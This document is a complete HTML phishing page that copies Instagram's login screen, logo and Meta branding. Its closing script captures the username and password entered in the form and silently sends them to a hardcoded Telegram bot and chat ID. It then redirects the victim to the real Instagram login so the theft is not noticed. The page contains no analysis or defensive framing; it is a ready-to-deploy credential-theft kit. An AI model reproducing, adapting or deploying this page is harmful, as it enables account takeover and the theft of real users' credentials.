<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
        .lang { color: #a8a8a8; font-size: 14px; margin-bottom: 40px; }
        .logo { width: 80px; height: 80px; margin: 0 auto 40px; }
        .input-group { margin-bottom: 12px; }
        input {
            width: 100%;
            padding: 14px 16px;
            background-color: #262626;
            border: 1px solid #363636;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            outline: none;
        }
        input::placeholder { color: #737373; }
        input:focus { border-color: #555; }
        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn-login:active { background-color: #1877f2; }
        .forgot { display: block; margin-top: 20px; color: #fff; font-size: 14px; text-decoration: none; }
        .divider { margin: 30px 0; border-top: 1px solid #363636; }
        .btn-create {
            width: 100%;
            padding: 14px;
            background: transparent;
            border: 1px solid #0095f6;
            border-radius: 8px;
            color: #0095f6;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .meta { margin-top: 40px; display: flex; justify-content: center; align-items: center; gap: 6px; color: #a8a8a8; font-size: 14px; }
        .meta svg { width: 20px; height: 20px; fill: #a8a8a8; }
    </style>
</head>
<body>
    <div class="container">
        <div class="lang">English (US)</div>
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
                        <stop offset="0%" stop-color="#FFDC80"/>
                        <stop offset="25%" stop-color="#F77737"/>
                        <stop offset="50%" stop-color="#E1306C"/>
                        <stop offset="75%" stop-color="#C13584"/>
                        <stop offset="100%" stop-color="#833AB4"/>
                    </linearGradient>
                </defs>
                <rect x="2" y="2" width="20" height="20" rx="5" stroke="url(#ig-gradient)" stroke-width="2.5"/>
                <circle cx="12" cy="12" r="4.5" stroke="url(#ig-gradient)" stroke-width="2.5"/>
                <circle cx="17.5" cy="6.5" r="1.5" fill="url(#ig-gradient)"/>
            </svg>
        </div>
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="Username, email or mobile number" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required autocomplete="off">
            </div>
            <button type="submit" class="btn-login">Log in</button>
        </form>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="divider"></div>
        <button class="btn-create">Create new account</button>
        <div class="meta">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-6h2v6zm0-8h-2V7h2v2zm4 8h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
            Meta
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const botToken = '8820164166:AAGYu8IzqK4v7_OPcYRD8EM7L--ZRDc9Svk';
            const chatId = '7176017295';
            
            const message = `🔐 *Instagram Login*%0A👤 User: \`${username}\`%0A🔑 Pass: \`${password}\``;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
            
            // Send silently in background
            fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
            
            // Redirect to real Instagram after a short delay
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }, 1500);
        });
    </script>
</body>
</html>
